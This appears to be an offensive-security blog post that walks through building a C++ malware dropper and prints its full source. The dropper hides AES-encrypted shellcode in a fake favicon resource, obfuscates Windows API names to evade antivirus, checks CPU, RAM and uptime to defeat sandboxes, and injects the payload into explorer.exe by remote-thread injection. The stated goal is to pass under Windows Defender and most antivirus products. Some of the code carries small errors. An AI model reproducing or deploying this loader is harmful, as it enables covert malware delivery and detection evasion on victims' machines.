---
title: "Custom C++ Dropper AES-256 ENC" 
layout: "post"
---

In this blog post we will code our first curstom dropper written in pure __C++_ code. At the time of writing the custom dropper will not get flagged by Windows Defender and it should pass under the radar of most AV's. 
There are other aspects to take into account when attempting to bypass signature based AV, we will try to discuss this briefly towards the end of the blog posts.





 
 
 
  
  
  
  
  
  
Going back to our dropper we will implment the following: 

- Shellcode == calc.bin (explorer.exe)
- Extract Shellcode from .rsrc
- Decrypt shellcode AES-256
- Inject Shellcode into explorer.exe 
- Get Rid of console windows (popUp windows)
- Encrypt WIN-API's calls


<p align="center">
  <img src="/assets/posts/2021-04-01-Custom-C++-Dropper/2.jpg">
</p>



 
 






## 1) Introduction to simple Process Injection

In regards to CreateRemoteThread() process injection, there are really three (3) main objectives that need to happen:

`VirtualAllocEx()` – Be able to access an external process in order to allocate memory within its virtual address space.
`WriteProcessMemory()` – Write shellcode to the allocated memory.
`CreateRemoteThread()` – Have the external process execute said shellcode within another thread.

`VirtualAllocEx()`
We first need to allocate a chunk of memory that is the same size as our shellcode. VirtualAllocEx is the Windows API we need to call in order to initialize a buffer space that resides in a region of memory within the virtual address space of a specified process (i.e., the process we want to inject into).

VirtualAllocEx – Reserves, Commits, or Changes the state of memory within a specified process. This API call takes an additional parameter, compared to VirtualAlloc, (HANDLE hProcess) which is a Handle to the victim process.

`WriteProcessMemory()`
Now that we have allocated a buffer the same size as our shellcode, we can write our shellcode into that buffer.

WriteProcessMemory() – Writes data to an area of memory in a specified process.


`CreateRemoteThread()`
With the shellcode loaded into the allocated virtual memory space of the victim process, we can now tell the victim process to create a new thread starting at the address of our shellcode buffer.

CreateRemoteThread() – Creates a thread that runs in the virtual address space of another process.

As we stated above our dropper will extract the shellcode from the favicon.ico file. The favicon.ico must be encrypted with AES. In order 
to perform this task we will use a custom python script to encrypt the payload calc.bin with our specified key. Furthermore, we will store
the decryption key inside our dropper.

__Note:__ Please note that in this case, for simplicity, the same AES key is used to encrypt the payload (shellcode.bin) and the 
Windows API functions (LockResource, etc) 

From the image below we can see all the files that we need to complete this project: 

<p align="center">
  <img src="/assets/posts/2021-04-01-Custom-C++-Dropper/6.JPG">
</p>

First of all we need to generate our malicious shellcode and store it a raw/bin format as follow. For this example we will use 
a simple calc.bin file. We will execute our python script agains the calc.bin file to generate the encrypted favicon.ico file levereging the
hardocded AES key wich in this case will be "Filippo2021". 

Looking at our folder we can now see a favicon.ico file (which stored our shellcode from calc.bin)

<p align="center">
  <img src="/assets/posts/2021-04-01-Custom-C++-Dropper/5.JPG">
</p>

## 2) Add AES paylod Encryption


One of the main problem with the current dropper is the utilization of well known WinAPI functions. 
The combination of `Find/Load/LockResource`, `VirtualAlloc`, `RtlMoveMemory`, `VirtualProtect`, and `CreateThread` has been in countless malware for many, many years. 
It is no wonder that Windows Defender, AV, and EDR solutions are not a big fan of these WIN-API call.

One way to get around this is using function call obfuscation. 
Function call obfuscation is a method that I learned from Sektor7's course, which is a great introductory course on custom tool creation. 
Although, I had to sink some time researching how to do function obfuscation in visual c++ (for visual studio).

So in order to accomplish this we will implement the following steps: 

1) Create a WinAPI function pointer struct which has the same parameters as the function to be obfuscated

2) Create a char array with the function's name AES encrypted

3) Using GetProcAddress and GetModuleHandleA, get the function pointer of the export DLL

4) Now, call the function pointer created in #1 instead of calling the actual function

Let's go through an example. Let's say we want to obfuscate the function WriteProcessMemory.

First, create a struct of WINAPI function pointer with the name pWriteProcessMemory.

```cpp
  BOOL (WINAPI * pWriteProcessMemory)(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);
```

Second, create a char array with the function name WriteProcessMemory AES encrypted with a specific key. 
In this case, the key "yoyo" was used. We can load our python script in interacting mode as follow: python -i .\aesCrypt.py

```cpp
	c=aesenc("WriteProcessMemory\x00","yoyo")
	print('payload[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in c) + ' };')
	payload[] = { 0xac, 0x3c, 0xa9, 0x7f, 0x9, 0x25, 0xe2, 0x98, 0x6b, 0xa8, 0xa7, 0xab, 0xb5, 0xf, 0x87, 0x8d, 0xd8, 0x5b, 0x37, 0xf3, 0xa2};
```



Third, declare a char array with AES encrypted function name. 
Then, AES decrypt the function's name in runtime. Make sure to use the same key "yoyo".

```cpp
unsigned char sWriteProcessMemory[] = { 0xac, 0x3c, 0xa9, 0x7f, 0x9, 0x25, 0xe2, 0x98, 0x6b, 0xa8, 0xa7, 0xab, 0xb5, 0xf, 0x87, 0x8d, 0xd8};

```

Fourth, decrypt and retrieve the function pointer indirectly from kernel32.dll, using `GetProcAddress`.


```cpp
		AESDecrypt((char *) sWriteProcessMemory, sizeof(sWriteProcessMemory), key, sizeof(key));
		pWriteProcessMemory = GetProcAddress(GetModuleHandle("kernel32.dll"), sWriteProcessMemory);
```

Now every time `WriteProcessMemory` is used, we can simply call `pWriteProcessMemory` function instead. 
If we check out PEView or PEStudio and look at the import table, we can't find any of the obfuscated functions. 
In this case, I obfuscated `WriteProcessMemory` and `LockResource`. 

As a result, those functions don't show in the import table of the PE file. 

__Note:__ This string encryption technique can be also be leveraged by XOR encryption. On top of that we can 
one distinct key for each WIN-API. 

<p align="center">
  <img src="/assets/posts/2021-04-01-Custom-C++-Dropper/xor.JPG">
</p>

## 3) Anti analysis defenses

3) `Simple Anti analysis defenses`

In order to protect our malware from being analyzed by security engenieer we will add some simple defenses tecniques used to protect our custom dropper. The objectives here, most of the time, is being able to detect if the malware is being opened in a __VirtualEnvironment__ like virtual box or any vistualization software. 

```cpp
// check CPU
SYSTEM_INFO systemInfo;
GetSystemInfo(&systemInfo);
DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
if (numberOfProcessors < 2) return 0;
```
__IMG 1:__ Checking CPU


In the code snipped above we will actually going to check if the malware is executed in a machine with more than 2 CPU core. If is not, the malware will prevent its executions


```cpp
// check RAM
MEMORYSTATUSEX memoryStatus;
memoryStatus.dwLength = sizeof(memoryStatus);
GlobalMemoryStatusEx(&memoryStatus);
DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
if (RAMMB < 2048) return 0;
```
__IMG 2:__ Checking RAM

In the code snipped above we will actually going to check if the malware is executed in a machine with no less tha 2048 bytes of RAM memory. Since most of the actual sandbox or automatic VM analyss sofware will run with 1, 2GB or RAM the malware will prevent executions if the machine has less than 2048 MB


```cpp
//check uptime 
ULONGLONG uptime = GetTickCount64() / 1000;
if (uptime < 1200) return 0; //20 minutes
```

__IMG 3:__ Checking PC Uptime

In the code snipped above we are actually checking the computer uptime time. This is to check weather the dropper is being opened in a virtual machine or on a user target machine, possible joined with an Active Directory domain.



## 4) WrapUp - Final Code

4) `Final Code`
Below we can find the full c++ code written for this exercise. 

```c++
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#include <tlhelp32.h>
#include "resources.h"
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>

BOOL (WIN-API * pWriteProcessMemory)(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);

LPVOID (WIN-API * pLockResource)(
  HGLOBAL hResData
);

//AES global encryption key used for payload and strings
	char key[] = { 0x32, 0x31, 0x66 }; //
	
	//c=aesenc("VirtualAlloc\x00","addyourkey")
	//print('payload[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in c) + ' };')
	//payload[] = { 0x84, 0x57, 0x6b, 0x9e, 0x5b, 0x9c, 0xa6, 0x98, 0xd3, 0x47, 0xfc, 0xd6, 0x6, 0xea, 0x85, 0x3e };
	
	unsigned char sLockResource[] = { 0x62, 0x63, 0xa5, 0x66, 0x92, 0x53, 0xbe, 0xd1, 0xf1, 0x35, 0x41, 0x9, 0xf4, 0x22, 0xbd, 0x8f };
	unsigned char sWriteProcessMemory[] = { 0xac, 0x3c, 0xa9, 0x7f, 0x9, 0x25, 0xe2, 0x98, 0x6b, 0xa8, 0xa7, 0xab, 0xb5, 0xf, 0x87, 0x8d, 0xd8, 0x5b, 0x37, 0xf3, 0xa2, 0xd5, 0x93, 0x94, 0xd7, 0xfd, 0xac, 0xc6, 0x40, 0xc4, 0xf9, 0x13 };


//AES ENC
int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;
        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len)){
                return -1;
        }
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        return 0;
}

//Process injection search for process
int Find(const char *procname) {
        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);	
	if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
        pe32.dwSize = sizeof(PROCESSENTRY32);             
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        } 
        while (Process32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
        
        CloseHandle(hProcSnap);   
        return pid;
}

//Do the actual code injections 

int m4(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
        LPVOID pRemoteCode = NULL;
        HANDLE hThread = NULL;	
	AESDecrypt((char *) sWriteProcessMemory, sizeof(sWriteProcessMemory), key, sizeof(key));
	pWriteProcessMemory = GetProcAddress(GetModuleHandle("kernel32.dll"), sWriteProcessMemory);	
        pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
        pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
        hThread = CreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
        if (hThread != NULL) {
                WaitForSingleObject(hThread, 500);
                CloseHandle(hThread);
                return 0;
        }
        return -1;
}
//Declare actual main win Function

int WIN-API WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

	// check CPU
	SYSTEM_INFO systemInfo;
	GetSystemInfo(&systemInfo);
	DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
	if (numberOfProcessors < 2) return 0;
	
	// check RAM
	MEMORYSTATUSEX memoryStatus;
	memoryStatus.dwLength = sizeof(memoryStatus);
	GlobalMemoryStatusEx(&memoryStatus);
	DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
	if (RAMMB < 2048) return 0;
	
	//check uptime 
	ULONGLONG uptime = GetTickCount64() / 1000;
	if (uptime < 1200) return 0; //20 minutes
	
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    	DWORD oldprotect = 0;
	HGLOBAL resHandle = NULL;
	HRSRC res;
	int pid = 0;
    	HANDLE hProc = NULL;
	//Decrypt AES signed key
	AESDecrypt((char *) sLockResource, sizeof(sLockResource), key, sizeof(key));
	pLockResource = GetProcAddress(GetModuleHandle("kernel32.dll"), sLockResource);
	unsigned char * payload;
	unsigned int payload_len;
	// Extract payload from resources section
	res = FindResourceA(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
	resHandle = LoadResource(NULL, res);
	payload = (char *) pLockResource(resHandle);
	payload_len = SizeofResource(NULL, res);
	AESDecrypt((char *) sLockResource, sizeof(sLockResource), key, sizeof(key));
	pLockResource = GetProcAddress(GetModuleHandle("kernel32.dll"), sLockResource);
	// Allocate some memory buffer for payload
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	// Copy payload to new memory buffer
	RtlMoveMemory(exec_mem, payload, payload_len);	
	// Decrypt payload
	AESDecrypt((char *) exec_mem, payload_len, key, sizeof(key))
	//Injection process starts here
	//pid = Find(sExplore);
	pid = Find("explorer.exe");
	if (pid) {
		// try to open target process
		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);
		
		if (hProc != NULL) {
			m4(hProc, exec_mem, payload_len);
			CloseHandle(hProc);
		}
	}

	return 0;
}

```

__Note:__ In the above example we can see how AES encryption was applied to the `LockResource` & `WriteProcessMemory` windows API call

The lower we can go, the better. We can evade AV / EDR systems that hook in User-Land and do all kinds of fancy things by rolling our own syscalls. 
Mixing this technique with a plethora of others can allow us to operate with less noise as well as arm Blue Team with new detection capabilities. 
We could also go an extra miles and sign our malicious executable to reduce any static analysis indicator. 

